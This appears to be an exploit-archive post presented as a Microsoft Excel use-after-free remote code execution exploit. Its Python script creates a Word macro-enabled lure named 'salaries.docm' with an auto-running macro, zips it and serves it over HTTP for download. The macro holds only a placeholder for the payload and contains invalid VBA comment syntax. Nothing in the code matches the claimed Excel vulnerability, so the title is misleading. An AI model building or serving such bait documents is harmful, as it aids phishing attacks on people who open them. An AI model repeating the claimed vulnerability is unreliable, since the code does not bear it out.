#Microsoft Excel 2024 Use after free - Remote Code Execution (RCE)
#Microsoft Office LTSC 2024 , Microsoft Office LTSC 2021,
#Microsoft 365 Apps for Enterprise
#!/usr/bin/python

import os
import sys
import pythoncom
from win32com.client import Dispatch
import http.server
import socketserver
import socket
import threading
import zipfile

PORT = 8000
DOCM_FILENAME = "salaries.docm"
ZIP_FILENAME = "salaries.zip"
DIRECTORY = "."

def create_docm_with_macro(filename=DOCM_FILENAME):
    pythoncom.CoInitialize()
    word = Dispatch("Word.Application")
    word.Visible = False

    try:
        doc = word.Documents.Add()
        vb_project = doc.VBProject
        vb_component = vb_project.VBComponents("ThisDocument")

        macro_code = '''
Sub AutoOpen()
      //YOUR EXPLOIT HERE
      // All OF YPU PLEASE WATCH THE DEMO VIDEO
      // Best Regards to packetstorm.news and OFFSEC
End Sub
'''

        vb_component.CodeModule.AddFromString(macro_code)

        doc.SaveAs(os.path.abspath(filename), FileFormat=13)
        print(f"[+] Macro-enabled Word document created: {filename}")

    except Exception as e:
        print(f"[!] Error creating document: {e}")
    finally:
        doc.Close(False)
        word.Quit()
        pythoncom.CoUninitialize()

def zip_docm(docm_path, zip_path):
    with zipfile.ZipFile(zip_path, 'w', compression=zipfile.ZIP_DEFLATED)
as zipf:
        zipf.write(docm_path, arcname=os.path.basename(docm_path))
    print(f"[+] Created ZIP archive: {zip_path}")

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
    except Exception:
        ip = "127.0.0.1"
    finally:
        s.close()
    return ip

class Handler(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, directory=DIRECTORY, **kwargs)

def run_server():
    ip = get_local_ip()
    print(f"[+] Starting HTTP server on http://{ip}:{PORT}")
    print(f"[+] Place your macro docm and zip files in this directory to
serve them.")
    print(f"[+] Access the ZIP file at: http://{ip}:{PORT}/{ZIP_FILENAME}")
    with socketserver.TCPServer(("", PORT), Handler) as httpd:
        print("[+] Server running, press Ctrl+C to stop")
        httpd.serve_forever()

if __name__ == "__main__":
    if os.name != "nt":
        print("[!] This script only runs on Windows with MS Word
installed.")
        sys.exit(1)

    print("[*] Creating the macro-enabled document...")
    create_docm_with_macro(DOCM_FILENAME)

    print("[*] Creating ZIP archive of the document...")
    zip_docm(DOCM_FILENAME, ZIP_FILENAME)

    print("[*] Starting HTTP server in background thread...")
    server_thread = threading.Thread(target=run_server, daemon=True)
    server_thread.start()

    try:
        while True:
            pass  # Keep main thread alive
    except KeyboardInterrupt:
        print("\n[!] Server stopped by user.")
